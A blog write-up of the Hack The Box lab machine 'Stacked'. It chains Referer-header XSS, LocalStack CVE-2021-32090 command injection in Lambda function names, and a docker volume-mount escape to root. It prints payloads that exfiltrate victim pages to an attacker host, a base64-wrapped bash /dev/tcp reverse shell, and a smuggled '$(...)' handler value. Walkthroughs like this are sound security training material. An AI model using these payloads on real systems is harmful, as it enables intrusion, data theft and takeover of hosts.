---
title: htb stacked
author: Yuchao
date: 2022-03-29 11:33:00 +0800
categories: [sec]
tags: [htb, aws, localstack]
math: true
mermaid: true
---

## recon

#### nmap
```
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112
nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
```
- 22/tcp   open  ssh; 80/tcp   open  http; 2376/tcp open  docker

#### feroxbuster, directory discovery
``` feroxbuster -u http://stacked.htb ```

#### wfuzz, host discovery
``` wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /usr/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26```
- hide word length 26 responses
- find host: portfolio.stacked.htb - TCP 80
- a local stack development page.
- <https://github.com/localstack/localstack>
- serverless: run services often used for Serverless apps (iam, lambda, dynamodb, apigateway, s3, sns)

## XSS

#### recon for XSS
- input area, and interesting headers.
- add payload as ``` <img src="http://{attackerIP}/fieldname_or_header_name"> ``` in different places.
- send the request.
attacker machine
``` sudo python3 -m http.server 80 ```
- 80 as we did not specify port in set payload
- wait a while
- ``` "GET /referer HTTP/1.1" 404 - ```
- so the ONLY field vulnerable to XSS is: Header -> referer.
- - run ``` date ``` two times, culculate the XSS victim(background cron) activity interval.
- interesting material below.
- <https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/>

#### find out what the URL the victim is looking at.
- Burpsuite set header Referer: <script src="http://{attackerIP}/pwn.js"></script>
- ``` python3 -m http.server 80 ``` at pwn.js location, for victime to run pwn.js.
- use nc to accept the victim`s response.

xmlhttprequest:
- like background web request by browser.
```javascript
XMLHttpRequest.open(method, url, async)
// if async = false, the script itself will not go foward, until the response. Otherwise, we will get null.
XMLHttpRequest.send(body)
// body: Optional, A body of data to be sent in the XHR request.
```

Method 1:(lucky there is a referer header)
```javascript 
<script src="http://10.10.14.6/xss.js"></script> 
```
- in the victim`s referer, we can see the response is from: "/read-mail.php?id=5"

Method 2: (more generic)
```javascript
var exfilreq = new XMLHttpRequest();    
exfilreq.open("GET", "http://{attackerIP}/" + document.location, false);    
exfilreq.send(); 
```
- set above script as pwn.js
- when we nc at 80, can see the victim`s current page appended.
- in nc, we get "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1"
- For victim visited "http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2"

This step we find out the inner email host name. (mail.stacked.htb)

#### Let victim visit inner pages for us.

```javascript
// Make target to visit the target
var target = "{the address we want victim to visit}"
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send()
var response=req1.responseText;
// Send what victim saw back to us
var req2 = new XMLHttpRequest();
req2.open('POST', "http://{attackerIP}:8000/", false)
req2.send(response);
```
- set target to "http://mail.stacked.htb/read-mail.php?id=1"
- read the mail.
- find new host "s3-testing.stacked.htb"
- a s3 domain.


## LocalStack vulnerability

#### Find CVE-2021-32090 
- locatstack version v0.12.6
- CVE search
- CVE-2021-32090 
- The dashboard component of StackLift LocalStack 0.12.6 allows attackers to inject arbitrary shell commands via the functionName parameter.

#### configure aws
```bash
apt install awscli
aws configure 
aws [command] [subcommand] --endpoint-url http://s3-testing.stacked.htb
```
- as the config said "SERVICES=serverless"
``` aws lambda list-functions --endpoint-url http://s3-testing.stacked.htb ```

#### Create lambda(this box only has nodejs runtime)
- <https://aws.amazon.com/lambda/>
- <https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html>

create random lambda function
```javascript
//example from official website
exports.handler = async function(event, context){
  console.log("Event: \n" + JSON.stringify(event, null ,2))
  return context.logStreamName
}
```
{: .nolineno file="index.js" }
zip index.js
``` zip index.zip index.js ```
create this function at endpoint
```bash
aws lambda create-function \
    --function-name 'a' \
    --zip-file fileb://index.zip \
    --handler index.handler \
    --role localstackdonotmatter\
    --runtime nodejs10.x
```
invoke the function
```bash
aws lambda --endpoint=http://s3-testing.stacked.htb \
  invoke --function-name a output
```
check if it run properly
``` cat output ```

PS: 
- if use python script, set "Runtime": "python3.7", but this machine does not have python runtime, so there would be an error.
- A Lambda function can be thought of as spinning up a relatively empty container, running the function, and then tearing that container down. So it`s not properate to make a reverse shell by lambda.

#### Exploit CVE-2021-32090 

The idea here is that there is a command injection in the "function name", will be triggered when it’s displayed on the web dashboard.
- In previous config file, we know that dashboard is at port 8080 on victim`s machine.
- ref: <https://blog.sonarsource.com/hack-the-stack-with-localstack>

how:
- 1. send user to dashboard by XSS. 
- In referer header add: ``` <script>document.location="http://127.0.0.1:8080"</script> ```
- 2. command inection in "function name".
- Test simple wget command first.

## reverse shell

#### execute shell
```bash
echo -n 'bash -i >& /dev/tcp/{attackerIP}/{port} 0>&1' | base64 -w 0
```
- add some space to avoid '+' or '=' sign, maybe bad character.(maybe not needed)

invoke the command
```bash
--function-name 'echo -n {base64 reverseshell} | base64 -d | bash'
```

#### upgrade shell
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
```

#### make the shell can clear screen
```
export TERM=xterm
```

Now in the localstack container.

## privesc

#### PSPY
- pspy - unprivileged Linux process snooping
- <https://github.com/DominicBreuker/pspy>
- download to victim, can not run at /dev/shm (noexec), but can run at /tmp
- find that handler was run by root.
- so add handler the reverse shell.
```bash
aws lambda create-function \
    --function-name '{not this time}' \
    --zip-file fileb://index.zip \
    --handler '$({the reverse shell command as before})' \
    --role localstackdonotmatter\
    --runtime nodejs10.x
```
- get root of the container.
- On gtfobins.io
```bash
# Shell
# It can be used to break out from restricted environments by spawning an interactive system shell.
# The resulting is a root shell.
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
then get the system root.

